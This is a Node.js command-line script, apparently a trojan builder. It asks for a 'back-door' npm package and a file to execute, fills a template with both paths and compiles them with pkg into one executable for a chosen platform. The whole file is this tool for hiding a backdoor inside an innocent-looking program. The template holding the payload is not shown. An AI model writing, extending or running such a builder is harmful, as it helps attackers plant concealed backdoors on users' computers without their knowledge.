#!/usr/bin/env node

const inquirer = require('inquirer')
const path = require('path')
const fs = require('fs')
const pkg = require('pkg')
const { ncp } = require('ncp')
const { validatePath, dirIsPackage, rmDir, replaceAll } = require('./src/utils')
const { main, package_path: packagePath } = require('./src/template')

// Costant values
const BACK_DOOR = 'back-door'
const FILE_TO_EXECUTE = 'file2exec'
const PLATFORM = 'platform'
const TEMPORANEY_FN = 'temp.js'
const PACKAGE = 'package.json'

var prompt = inquirer.createPromptModule()

;(async function () {
  const indexDir = path.dirname(process.argv[1])
  const buildingDir = path.join(indexDir, 'build')
  // const templatePath = path.join(indexDir, 'src/template.js')
  const locaBackdoorDir = path.join(buildingDir, 'back_door')
  rmDir(locaBackdoorDir, false)
  var ui = new inquirer.ui.BottomBar()
  ui.log.write(require('./src/icon'))

  const backdoor = (await prompt({ name: BACK_DOOR, message: 'Select the javascript main of the npm package to execute:', validate: validatePath }))[BACK_DOOR]

  if (!dirIsPackage(backdoor)) throw new Error('The js file isn\'t the main of npm package')

  const file2exec = (await prompt({ name: FILE_TO_EXECUTE, message: 'Insert the file to execute:', validate: validatePath }))[FILE_TO_EXECUTE]
  const platform = (await prompt({ name: PLATFORM, type: 'list', message: 'Select target platform', choices: ['freebsd', 'linux', 'alpine', 'macos', 'win'] }))[PLATFORM]

  let currentCode = main

  currentCode = replaceAll(currentCode, '*__execpath__*', `'${file2exec}'`)
  currentCode = replaceAll(currentCode, '*__backdoor__*', `'${'./back_door/' + path.basename(backdoor)}'`)

  // Initializing building directory
  try {
    fs.mkdirSync(buildingDir)
    fs.mkdirSync(locaBackdoorDir)
  } catch (e) {}

  // Init building of npm package
  const currentCodePath = path.join(buildingDir, TEMPORANEY_FN)
  const currentPackagePath = path.join(buildingDir, PACKAGE.toString())

  fs.writeFileSync(currentCodePath, currentCode)
  fs.writeFileSync(currentPackagePath, JSON.stringify(packagePath))
  // Copy of the application package
  ncp(path.dirname(backdoor), locaBackdoorDir)

  pkg.exec([currentCodePath, '--target', `${platform}`, '--output', `${path.basename(file2exec)}.out`])
})()
